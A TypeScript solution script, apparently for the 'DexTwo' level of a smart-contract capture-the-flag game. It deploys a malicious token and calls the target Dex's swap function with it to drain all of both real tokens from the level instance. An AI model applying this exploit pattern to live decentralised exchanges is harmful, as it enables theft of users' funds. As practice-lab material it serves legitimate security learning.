import { Dex, DexTwoAttackToken } from '../../typechain-types';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const DEX_TWO_LEVEL_NAME = "DexTwo"

export const dexTwoAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            console.log('Deploying DexTwoAttacker evil token')
            const evilToken = await ethereum.deployContract<DexTwoAttackToken>('DexTwoAttackToken');
            const dex = await ethereum.getContract<Dex>('Dex', instanceAddress);

            const token1 = await dex.token1();
            const token2 = await dex.token2();

            console.log('Depleting all the token1 amount');
            const token1Tx = await dex.swap(await evilToken.getAddress(), token1, 1);
            await token1Tx.wait();
            console.log('Depleting all the token2 amount');
            const token2Tx = await dex.swap(await evilToken.getAddress(), token2, 1);
            await token2Tx.wait();
        }
    }
}